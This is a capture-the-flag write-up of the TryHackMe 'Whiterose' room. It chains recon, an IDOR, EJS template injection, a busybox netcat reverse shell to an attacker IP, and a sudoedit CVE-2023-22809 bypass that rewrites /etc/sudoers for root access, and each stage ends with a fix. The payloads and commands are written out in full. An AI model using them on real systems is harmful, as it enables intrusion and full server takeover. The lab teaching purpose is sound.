# Whiterose (TryHackMe) — Write-Up

Welcome to Hacker Yak's Write Ups!

This is the first post in a series where I document rooms I've worked through on TryHackMe. The explanations live in collapsible sections so this reads fine whether you already know the tools or you're seeing them for the first time.

**Today's Room:** Whiterose — a boot2root challenge <br>

**Themed after:** Mr. Robot, "409 Conflict" — spoilers ahead if you haven't seen it <br>

**My rating in difficulty:** ⭐⭐⭐☆☆ (3 / 5) (0 = Extremely Easy, 5 = Extremely Hard) <br>

<details>
<summary><b>💭 Why I'd rate it this way</b></summary><br>

> Nothing in this room requires writing your own exploit from scratch but the hard part is finding them and weaving together multiple concepts to succeed. That keeps it out of "Beginning" territory for me, but it's not an "Advanced" box either. This challenge chains five distinct vulnerability classes (weak creds, an IDOR, plaintext credential leakage, SSTI/RCE, and a sudo privilege-escalation CVE).

<br></details>

<details>
<summary><b>📌 Quick TL;DR</b></summary><br>

> > **In short:** One login to a bank's admin panel snowballs into full root access on the server — through a leaked password, a code-injection bug, and a misconfigured sudo rule.
>
> **The attack chain, step by step:**
>
> 1. **Recon** — Nmap scan finds only SSH and a web server open.
> 2. **Subdomain discovery** — Fuzzing uncovers a hidden admin panel at `admin.cyprusbank.thm`.
> 3. **Initial access** — Default credentials log in as a low-privileged bank employee.
> 4. **IDOR** — Tweaking a chat-message ID (`?c=`) leaks an admin's plaintext password from old chat logs.
> 5. **SSTI → RCE** — The admin's Settings page is vulnerable to Server-Side Template Injection in EJS (CVE-2022-29078/2023-29827 lineage, GitHub issue #735), giving full remote code execution.
> 6. **Shell access** — RCE is upgraded to a reverse shell, then a full interactive terminal (PTY). User flag captured.
> 7. **Privilege escalation** — `sudo -l` reveals passwordless `sudoedit` access to one config file, but CVE-2023-22809 (an EDITOR variable file-smuggling bug) is abused to edit `/etc/sudoers` instead, granting full root access. Root flag captured.
>
> Each stage includes a root-cause explanation and a "Fix" (proper server-side auth checks, whitelisting template inputs, patching sudo, etc.)

<br></details>

## What Is "Boot2Root," Anyway?

I wanted to start this series with a classic boot2root. You boot up a vulnerable machine, and your goal is to get all the way to the highest level of access on a Linux system: root, the admin account that can do anything. It's the "hello world" of offensive security, and gets newcomers hooked on this stuff.

Alright — let's get into it.

## The Five-Step Process

Before diving in, here's the mental breakdown I use for every boot2root challenge. It breaks the work into small pieces that I can reason with one at a time.

| # | Step | The question you're asking |
|---|------|------------------------------|
| 1 | Reconnaissance | What's even running on this machine? |
| 2 | Enumeration | What's hiding underneath what's running? |
| 3 | Access & Discovery | Can I get through a door, and what does that door let me see that I shouldn't? |
| 4 | Vulnerabilities & Exploitation | Is something here actually broken and can I turn "broken" into something I can use to gain a foothold in the system? (getting a shell) |
| 5 | Privilege Escalation | Can I turn "getting a shell" into "getting the root shell"? |

Whiterose walks through all 5 cleanly enough that it's a genuinely good room to learn this framework on. Each section below is labeled with which step it belongs to. <br><br>

## Step 1 — Reconnaissance

The first thing we're given is a target IP address: `10.144.189.23`

<details>
<summary><b>❓ What is an IP address?</b></summary><br>

> A unique digital label assigned to every device on a network.  It's essentially the equivalent of a home address, but for a computer.

<br></details>

Before an attacker can break into a house, they have to know what doors and windows it has. That's what reconnaissance ("recon") is for: scanning the target to see what's actually running on it. **Nmap** does that knocking. Think of it as the Swiss Army knife of network scanning. It tells you which "ports" are open on a machine and what software is listening on them.

A solid go-to starting scan:

```
nmap -A -sV 10.144.189.23 -T5 -oN output.txt
```

Breaking that down:

- `-A` — turns on aggressive mode (OS detection, traceroute, and script scanning all at once)
- `-sV` — tries to identify the *version* of whatever software is running on each open port; helps because specific versions often have known, documented vulnerabilities
- `-T5` — cranks the scan speed to maximum. Great for a lab where you're not worried about being sneaky; in a real engagement you'd dial the speed down so you don't set off alarms
- `-oN output.txt` — saves the output, normally-formatted, to a file.

![Nmap aggressive scan output showing open ports 22 (SSH) and 80 (HTTP) on the target](/TryHackMe/Whiterose/images/nmap-scan-output.png)


<details>
<summary><b>💡 Why keep every scan output saved to a file?</b></summary><br>

> Because two hours from now I will have forgotten the exact wording of a response, and I will need it. Red team or blue team, the boring habit that actually separates people who are good at this from people who are just clicking around, is writing everything down. I keep a folder per challenge, a subfolder for Nmap specifically, and the raw output saved before I do anything else with it.

<br></details>

The scan came back with (simplified):

| Port | State | Service | Version |
|------|-------|---------|---------|
| 22 | Open | SSH | OpenSSH 7.6p1 (Ubuntu 4ubuntu0.7) |
| 80 | Open | HTTP | nginx 1.14.0 (Ubuntu) |

Two open doors:

- **Port 22 — SSH.** A protocol for securely logging into a remote machine's terminal. Without valid credentials, this isn't much use to us yet.
- **Port 80 — HTTP.** Plain, unencrypted web traffic which means that there's a website here. And a website means a browser is the next move. <br><br>

## Step 2 — Enumeration

### 2.1 Initial Site Exploration

The site didn't load at first, which for about thirty seconds felt like a bug in my setup and not a step in the challenge. But that's not the case.

![Firefox "Server Not Found" error when visiting cyprusbank.thm before adding it to /etc/hosts](/TryHackMe/Whiterose/images/dns-resolution-error.png)

The domain `cyprusbank.thm` isn't registered anywhere public, so the machine didn't know where to send the request. Adding it to `/etc/hosts` fixes that. It's a manual note that says, when I ask for this name, go here instead of asking the internet. 

<details>
<summary><b>❓ New to vim? Quick primer on editing this file</b></summary><br>

> To edit a file you need to use a text editor. The ones most often used in nano, for its simplicity or vim for its robust features. I personally like vim, so I opened the file by typing `sudo vim <filename>`. Sudo, which will be explained later in this writeup, is a command that allows you to perform an action with root permissions. `/etc/hosts` is a file only root can edit so by typing sudo, you are temporarily gaining root permission to edit the file. To start typing, you must click `I` (to insert), which allows you to modify the file. Once you're done inputting the address, you click `escape`, which allows you to perform commands related to saving the file. Then to exit after saving you type `:wq` and hit enter (write and quit). I'd recommend deep-diving into vim after this write-up.

<br></details>

![Terminal showing the command vim /etc/hosts being typed in](/TryHackMe/Whiterose/images/open-etc-hosts-file.png)

![Terminal showing /etc/hosts being edited in vim, then the resulting file with cyprusbank.thm pointed at the target IP](/TryHackMe/Whiterose/images/etc-hosts-file-edit.png)

With the domain resolving, my next reflex move is `robots.txt`, which sadly turned up nothing.

<details>
<summary><b>❓ What's robots.txt?</b></summary><br>

> A file websites use to tell search engine crawlers which pages not to index (websiteName.com/robots.txt). It's basically a signpost pointing at pages the site owner didn't want publicly listed. It's not a security control at all, since nothing stops you from just visiting those pages directly. It just keeps them out of search results. Checking it is often the fastest way to find something interesting.

<br></details>
<br>
### 2.2 Enumerating Directories With Gobuster

If the front door's locked, check for other doors. That's what directory brute-forcing is for, rapidly guessing at hidden pages and folders that might exist on the server.

```
gobuster dir -u http://10.144.189.23/ -w /usr/share/wordlists/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt -x html,js,txt,php,db,json,log,bak,old -k
```

<details>
<summary><b>❓ What's Gobuster?</b></summary><br>

> A brute-force content discovery tool: it takes a wordlist and requests each entry as a path against a target URL, watching for anything that isn't a 404.
>
> - `dir` — the mode for directory/file brute-forcing (as opposed to `dns` or `vhost` modes)
> - `-u` — the target URL
> - `-w` — path to the wordlist
> - `-x` — file extensions to test alongside each entry (so `admin` also tries `admin.php`, `admin.bak`, etc.)
> - `-k` — skip TLS certificate validation (useful against self-signed certs in a lab)

<br></details>

![Gobuster terminal output scanning the target, only turning up /index.html](/TryHackMe/Whiterose/images/gobuster-directory-scan.png)

No luck, `index.html` is the standard filename for the website's homepage. On to the next angle: subdomains.
<br>
### 2.3 Subdomain / Virtual Host Fuzzing With FFUF

Why try subdomains instead of more directories? Because a single server can quietly host multiple, separate websites under different subdomains (`admin.site.com` vs. `dev.site.com`). In web app pentesting, checking for hidden subdomains is one of the highest-value moves you can make — you're essentially asking, "does this server know about any other websites besides the one I can already see?"

<details>
<summary><b>📊 Directory fuzzing vs. VHost fuzzing</b></summary><br>

> | | Directory Fuzzing | VHost (Subdomain) Fuzzing |
> |---|---|---|
> | What changes | The URL path | The `Host` header |
> | What you're finding | Hidden pages/files on one site | Entirely separate sites on the same server |
> | Example | `http://site.com/FUZZ` | `Host: FUZZ.site.com` |

</details>
<br>


```
ffuf -w /usr/share/wordlists/SecLists/Discovery/DNS/subdomains-top1million-110000.txt -u http://cyprusbank.thm/ -H "Host: FUZZ.cyprusbank.thm" -fw 1
```

<details>
<summary><b>❓ What's FFUF?</b></summary><br>

> A fast HTTP fuzzer, like Gobuster but more flexible about *what part* of the request gets substituted with wordlist entries — which is why it's the better tool for virtual host fuzzing.
>
> - `-w` — the wordlist
> - `-u` — the target URL (stays constant — only the header changes)
> - `-H "Host: FUZZ.cyprusbank.thm"` — a custom header where `FUZZ` is the injection point; FFUF swaps in each wordlist word here instead of in the URL
> - `-fw 1` — "filter by word count": hide any response whose body has exactly 1 word, since that's the fingerprint of the wildcard/default page (see below)

<br></details>

And woah — hundreds and hundreds of `200 OK` results.

![FFUF running before a baseline filter is applied, showing many false-positive 200 OK hits like www and WWW](/TryHackMe/Whiterose/images/ffuf-initial-noisy-results.png)

Here's the part that trips a lot of people up the first time: **a `200 OK` doesn't automatically mean the subdomain exists.** When you fuzz a `Host` header, you're not changing the URL path — you're changing which virtual host the server *thinks* you're asking for. Some servers are configured with a wildcard/default site: ask for a subdomain they've never heard of, and they just shrug and serve the default page anyway, with a `200 OK`. Every guess in your wordlist looks like a hit — even the completely made-up ones.

The trick is establishing a baseline first. Deliberately ask for something you're sure doesn't exist:

```
curl -i -H "Host: random123456.cyprusbank.thm" http://cyprusbank.thm/
```

Whatever comes back — here, a `200 OK` with a body exactly 1 word long — is your fingerprint for "fake/nonexistent host" if a wildcard site is configured. Tell FFUF to hide anything matching it: `-fw 1`. Instead of drowning in false positives, FFUF now only shows responses that look *different* from the baseline — which is where the real subdomains are hiding.

![FFUF results after the baseline filter is applied, showing only two legitimate hits: www and admin](/TryHackMe/Whiterose/images/ffuf-filtered-results.png)

Two legitimate results: `www` and `admin`. `admin` is clearly the more interesting one, so it went into `/etc/hosts`, same as before.

![/etc/hosts edit](/TryHackMe/Whiterose/images/etc-hosts-admin.png)
<br><br>

## Step 3 — Access & Discovery

`admin.cyprusbank.thm` turned out to be a login page for the Cyprus National Bank admin panel. The credentials provided in the description of the room worked without any fuss: **Olivia Cortez : olivi8**

![Cyprus National Bank admin panel login page](/TryHackMe/Whiterose/images/admin-login-page.png)

Olivia's account doesn’t have full access to the data because only  some payment and account data are visible, but phone numbers and Settings completely off limits.

![Olivia Cortez's admin panel view, showing a Recent Payments table but no access to Settings](/TryHackMe/Whiterose/images/olivia-admin-panel-recent-payments.png)

<br>

## Step 4 — Vulnerabilities and Exploitation

Looking at the other tabs available to me, I found `Messages`, which loaded a chat log. Looking closer at the URL, I noticed that it carried a parameter that I HAD to tinker with:

```
http://admin.cyprusbank.thm/messages/?c=5
```

That `c` parameter looked worth testing: a textbook setup for an IDOR.

<details>
<summary><b>❓ What's an IDOR, actually?</b></summary><br>

> Short for Insecure Direct Object Reference. It's what happens when an app lets you pull up a specific record — a message, an invoice, an account — just by changing an ID number in the request, without ever checking whether you're supposed to see that particular one. Testing for it is this easy: change the number, see what happens.

<br></details>

![Messages page at ?c=5 showing a short chat log between admin users](/TryHackMe/Whiterose/images/messages-page-c5.png)

I bumped the number up on a hunch that it controlled how far back the history went — `?c=20` — aaaaaand…

![Messages page at ?c=20 revealing an earlier exchange where the dev team asked Gayle Bev for her password and she posted it in plaintext](/TryHackMe/Whiterose/images/messages-page-c20-leaked-password.png)

The guess was right! Buried in the extended log was an exchange where the dev team asked an admin user, Gayle Bev, for her credentials "for testing." In the chat. In plaintext.

> [!TIP]
> **Fix:** Never trust an ID pulled from the client as sufficient proof of authorization. Every request that fetches a record by ID needs a server-side check that the *currently authenticated user* is actually allowed to see that specific record.

Logging in as Gayle Bev opened the rest of the panel: full balances, phone numbers, higher permissions than Olivia's keycard ever reached.

![Gayle Bev's admin panel view showing full Accounts table with balances and phone numbers](/TryHackMe/Whiterose/images/gayle-admin-panel-full-access.png)

Now that `Settings` was available, I typed a throwaway value into the username and password fields — `a:b` — to see what the form would do with it. And to my surprise, a response banner came back on the page exactly as typed.

![Customer Settings page echoing the input back: "Password updated to 'b'"](/TryHackMe/Whiterose/images/settings-page-echo-response.png) <br>

<details>
<summary><b>💡 Why does that matter?</b></summary><br>

> An app that hands your own input straight back to you is telling you something about how it treats that input elsewhere too: it suggests the app might be blindly trusting what you typed instead of checking it first. A page that echoes you back verbatim is usually worth pushing on.

<br></details>

To push further, I opened **Burp Suite** (the free Community Edition — an industry-standard proxy that sits between your browser and the site, letting you intercept and edit requests before they're sent).

One of the most useful moves in any assessment: deliberately break things and read the error. I left the username field empty — the UI itself blocked this, but Burp let me bypass it and send the request anyway — and got back a very revealing error:

```
ReferenceError: /home/web/app/views/settings.ejs
```

![Burp Suite intercepting the empty-username request, with the browser showing a ReferenceError pointing at settings.ejs](/TryHackMe/Whiterose/images/burp-intercept-ejs-referenceerror.png)

`.ejs` — a file extension I didn't recognize. A quick search cleared it up fast.

EJS (Embedded JavaScript) is a popular templating engine for Node.js — it's how a site mixes static HTML with dynamic data, similar to a mail-merge. A value like `<%= username %>` in a template gets swapped for real data the moment the page is built. Under the hood, EJS actually compiles your template into runnable JavaScript before producing the final page — which matters enormously, because it means the boundary between "text" and "executable code" inside EJS is thinner than it looks.

Searching for `.ejs` exploits immediately surfaced a pattern: RCE via SSTI.

- **RCE (Remote Code Execution):** a vulnerability that lets an attacker run their own commands on someone else's server, as if they had a terminal open on the machine themselves.
- **SSTI (Server-Side Template Injection):** a bug where a template engine gets tricked into treating attacker-supplied text as code to execute instead of data to display — usually because user input reaches a part of the template-building process it was never meant to touch.

Digging through GitHub's issue tracker for `ejs` turned up [Issue #735](https://github.com/mde/ejs/issues/735), and it matched the error perfectly. <br>

<details>
<summary><b>🔍 How the actual bug works</b></summary><br>

> EJS had already fixed two rounds of this exact bug class — CVE-2022-29078 (attackers controlling the `outputFunctionName` setting) and CVE-2023-29827 (a related follow-up). To prevent a third round, EJS's maintainers added a defensive check: any user-influenced value getting inserted directly into the compiled template's source code is run through `_JS_IDENTIFIER.test()` — a check confirming the value looks like a safe identifier (a plain variable/function name, no stray punctuation) before it's trusted.
>
> Issue #735 shows that the check was incomplete, not wrong. It correctly guards several settings, but missed one: `escapeFn`, the internal variable populated from `opts.escapeFunction`. Because `escapeFn` never passes through `_JS_IDENTIFIER.test()`, it gets spliced into the generated code completely unvalidated.
>
> The vulnerable app took the entire URL query string and handed it straight to EJS with no filtering:
>
> ```
> res.render('index', req.query);
> ```
>
> That means a URL like this smuggles arbitrary code into the `escapeFunction` field:
>
> ```
> ?settings[view options][client]=true&settings[view options][escapeFunction]=<anything>
> ```
> `escapeFunction` is meant to hold the name of a function EJS should use to HTML-escape output — a legitimate customization point. Furthermore when the field `opts.client` is set to `true`, that name gets pasted directly into the JavaScript EJS generates, on the assumption that a function name can't contain anything dangerous.
> 
> From the issue's own proof-of-concept:
>
> ```
> name=John&settings[view options][client]=true&settings[view options][escapeFunction]=1;return global.process.mainModule.constructor._load('child_process').execSync('calc');
> ```
>
> | Part | Purpose |
> |---|---|
> | `name=John` | A throwaway value for the template's ordinary, expected field to keep the request looking legitimate |
> | `settings[view options][client]=true` | Switches EJS into "client" compile mode — the mode in which `escapeFn` gets spliced directly into the output, making the rest of the payload reachable |
> | `settings[view options][escapeFunction]=1;return ...` | The actual injection point. `escapeFunction` should hold a short function name; instead it holds `1;return <payload>` |
> | `global.process.mainModule.constructor._load('child_process')` | Reaches Node's built-in `child_process` module without directly calling `require`, since a bare `require` isn't reliably in scope inside EJS's compiled function |
> | `.execSync('calc')` | Runs the command synchronously and returns its output — Calculator, as a harmless proof arbitrary commands can run |

<br></details>

Following the exact syntax from the researcher's PoC, swapping in `whoami` first as a safe way to confirm code execution without doing anything destructive:

```
name=a&settings[view options][client]=true&settings[view options][escapeFunction]=1;return global.process.mainModule.constructor._load('child_process').execSync('whoami');
```

![Burp Suite request pane showing the SSTI payload with whoami sent to /settings](/TryHackMe/Whiterose/images/burp-ssti-whoami-request.png)

![Burp Suite response pane showing "web" returned, confirming code execution](/TryHackMe/Whiterose/images/burp-ssti-whoami-response.png)

**Result: `web`.** Confirmed — arbitrary commands were now running on the server.

> [!TIP]
> **Fix:** Never pass a raw `req.query` (or any unfiltered user input) directly into a template engine's render/config options. Explicitly whitelist the specific fields the template actually needs (`res.render('page', { name: req.query.name })`), keep the templating library updated, and treat any templating engine as executing *code*, not just *text*, when reasoning about trust boundaries.

Running a single command through the SSTI bug is a great proof-of-concept, but it's not useful for actually *exploring* the system, each request runs once and disconnects. The next goal: a live, interactive **reverse shell** — a way to stably communicate with the target's internal systems.

I first confirmed outbound connectivity worked by spinning up a throwaway HTTP server on my own machine and then `curl`-ing it from the target by typing this command, `curl http://<my_ip_address>`.  Success.

![Terminal running python -m http.server 80, receiving a GET request from the target IP](/TryHackMe/Whiterose/images/outbound-connectivity-test.png)

<details>
<summary><b>❓ What's curl, and what did we just do?</b></summary><br>

> `curl` is a command-line tool for making HTTP (and other protocol) requests directly, without a browser. Using Python, I opened a temporary port on my machine that accepts HTTP traffic, then sent a `curl` request from the target back to it — essentially a "ping" confirming the target can reach me. A plain `ping -c 1 <IP>` payload would have worked just as well to prove the same thing.

<br></details>

<details>
<summary><b>💡 Reverse shell vs. bind shell — why this direction?</b></summary><br>

> - A **bind shell** has the target open a port and wait for a connection — often blocked, since most networks are strict about unexpected inbound traffic.
> - A **reverse shell** has the target reach out to *you* instead — usually allowed, since outbound traffic is rarely watched as closely.
>
> That's why reverse shells dominate in practice, including here.

<br></details>

I started a listener on my own machine:

```
nc -nlvp 4444
```
<br>
<details>
<summary><b>❓ netcat (nc)</b></summary><br>

> A way to open a direct, bare-bones pipe between two computers over the network — no browser, no protocol assumptions, just raw data flowing from one side to the other. That simplicity is exactly what makes it useful for shells: since a reverse shell is really just "send my keystrokes to a remote machine and get its output back," netcat can act as either end of that connection.
>
> *   `-n` — skip DNS resolution (raw IPs only, faster)
> *   `-l` — listen for an incoming connection instead of initiating one
> *   `-v` — verbose output, so a connection shows up on screen when it lands
> *   `-p 4444` — the port to listen on

<br></details>

Then, through the SSTI injection point (execSync('')), I told the target to connect back to that listener:

```
busybox nc <attacker_IP> 4444 -e /bin/bash
```

<details>
<summary><b>❓ What is BusyBox, and why busybox nc specifically?</b></summary><br>

> Many modern Linux systems ship `netcat` compiled *without* the `-e` flag (which lets `nc` directly execute a program and pipe its input/output over the network) — precisely because that flag is so useful for attacks like this. **BusyBox** bundles its own lightweight versions of dozens of standard utilities — `ls`, `cat`, `nc`, `wget`, a basic shell, and more — into a single compact binary. It's often present on minimal or hardened boxes even when the "real" tools have been stripped down, and its `nc` build does support `-e`, making it a reliable fallback here.

<br></details>

And voila. My machine received a connection, and I can verify by typing `whoami`. As per the result, it is now clear I have gained access into the website’s machine.  

![Terminal running nc -nlvp 4444, showing a connection received and whoami returning "web"](/TryHackMe/Whiterose/images/reverse-shell-connection-received.png)

**Making the shell usable.** The shell that lands first is rough: no tab-completion, no arrow-key history, and pressing Ctrl+C kills the *entire* session instead of just the current command. So I immediately typed the following command. 

```
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

This asks the OS to allocate a real terminal device (a **PTY**, pseudo-terminal) instead of the bare pipe I had before, instantly restoring command history and proper program behavior.

Then I move this connection to the “background” and access my own machine. 

```
# Ctrl+Z first, to background the shell locally
stty raw -echo; fg
reset
```

- `stty raw -echo` — reconfigures my *own* local terminal to stop intercepting keystrokes like Ctrl+C, and pass them through to the remote shell instead
- `fg` — brings the backgrounded remote shell back to the foreground
- `reset` — clears up leftover terminal display glitches from the switch

From here, the shell behaved almost exactly like a normal terminal.

**Grabbing the first flag:**

```
cd ..        # change directory to the parent directory
ls           # list files
cat user.txt
```

![Terminal showing cat user.txt returning the user flag](/TryHackMe/Whiterose/images/user-flag-captured.png)

`user.txt` secured.
<br><br>

## Step 5 — Privilege Escalation

Now I need to find a way to gain elevated permissions — specifically, root.

`sudo` ("superuser do") is the standard way Linux lets specific, trusted users run commands as another user — usually root — without sharing the actual root password. For example `sudo vim /etc/hosts/` allows me to execute the command with root permissions. Checking what a compromised account is allowed to run via `sudo` is one of the very first privilege-escalation checks in any assessment.

```
sudo -l
```

![Terminal output of sudo -l showing web is allowed passwordless sudoedit on the nginx site config](/TryHackMe/Whiterose/images/sudo-l-output.png)

The result: my current user was allowed to run one specific command as root, with no password required:

```
(root) NOPASSWD: sudoedit /etc/nginx/sites-available/admin.cyprusbank.thm
```

<details>
<summary><b>❓ What's sudoedit, and why is it supposed to be safer?</b></summary><br>

> `sudoedit` is a narrower, safer-sounding cousin of `sudo`. Instead of giving you a full root shell, it's supposed to let you edit *one specific file* as root, and nothing else like being issued a key that opens exactly one door.

<br></details>

Searching for known `sudoedit` vulnerabilities led straight to [**CVE-2023-22809**](https://www.vicarius.io/vsociety/posts/cve-2023-22809-sudoedit-bypass-analysis?source=post_page-----fbe6a2bf70af---------------------------------------),  a bypass that turns that "one door" key into a master key.

<details>
<summary><b>🔍 How the bypass actually works</b></summary><br>

> The bug: In a simplified explanation, sudo's parsing of the user-controlled `EDITOR` variable didn't correctly separate "legitimate editor flags" from "an extra file smuggled in afterward" using the  `--` convention. When `EDITOR` is set to `vim -- /etc/shadow`, sudo splits it apart, sees `--`, and treats everything after it as more filenames to open. Here’s the amazing trick though, only the file you explicitly typed on the actual `sudoedit` command line gets checked against the sudoers policy. The extra file riding along inside `EDITOR` never does. Both files get written back as root once the edit finishes.
>
> Why an environment variable can even control this: environment variables are just settings that live in your shell session and get inherited by any program you run from it. `export EDITOR="vim"` tells every program that respects that convention, "when you need to open an editor, use this one." It's ordinary, intended behavior: tools like `git commit`, `crontab -e`, and `sudoedit` all check `$EDITOR` so users aren't locked into one editor. Nothing forces `EDITOR` to actually be an editor's name — it's just a string sitting in your environment until something reads and acts on it.
>
> What `--` is: a long-standing meaning that "everything after this point is a plain argument (like a filename), not a flag to be interpreted." It exists so that you can pass a filename that starts with a `-` (like `-test`) without a program mistaking it for an option. So `vim -- /etc/shadow` tells vim: don't try to interpret `/etc/shadow` as a flag, just open it as a file.

<br></details>

For this box, we want to open the `/etc/sudoers` file. The file that defines who's allowed to run what as root system-wide and if they need a password to run it:

```
export EDITOR="vim -- /etc/sudoers"
sudo sudoedit /etc/nginx/sites-available/admin.cyprusbank.thm
```


`sudo sudoedit <filename>` was the initial command that /etc/sudoers allowed the user `web` to run as root without having to authenticate. But after out `$EDITOR` environment variable edit, this popped open `/etc/sudoers` itself, in a root-privileged editor, despite my account never having been granted permission to touch that file directly.

I added a new line granting my own user full, password-free sudo access:

```
web ALL=(ALL:ALL) NOPASSWD: ALL
```

![/etc/sudoers file open in vim with a root privilege, showing the new NOPASSWD line added for the web user](/TryHackMe/Whiterose/images/etc-sudoers-edited.png)

With that rule in place, escalating was trivial:

```
sudo su          # su switches users; with no user specified, it defaults to root
cat /root/root.txt
```

![Terminal showing sudo su followed by cat /root/root.txt returning the root flag](/TryHackMe/Whiterose/images/root-flag-captured.png)

> [!TIP]
> **Fix:** Patch sudo to a version beyond 1.9.12p2 (or whatever release fixed CVE-2023-22809 for your distro) — this is a straightforward "keep your packages current" fix. More broadly, be conservative with `NOPASSWD` sudo grants: even a narrowly-scoped one, like editing a single nginx config, is only as safe as the tool (`sudoedit`) enforcing that scope. Where possible, avoid granting sudo rights to editor-based commands at all, since editors are exactly the kind of general-purpose tool that tends to have escape hatches like this one.

---

*Room: [Whiterose](https://tryhackme.com/room/whiterose) on TryHackMe. Next in the series drops within the week.*
